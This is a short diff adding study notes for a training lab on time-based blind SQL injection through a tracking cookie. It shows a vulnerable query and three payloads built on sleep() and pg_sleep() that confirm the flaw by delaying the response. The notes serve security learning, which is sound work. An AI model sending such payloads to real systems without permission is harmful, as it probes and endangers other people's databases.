@@ -1,0 +1,20 @@
+Lab13: Blind SQL Injection with time delays:
+
+Info:
+-----
+Vulnerability:  Tracking Cookie
+
+The SQL does not return any results. -> Can't use union based attack
+Application doesn't respond differently
+
+Goal: Prove that web app is vulnerabil to blind SQLI (Time based)
+
+Analysis:
+--------
+
+
+
+select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';
+
+' || (SELECT sleep(10))-- -x
+' || (SELECT pg_sleep(10))-- 
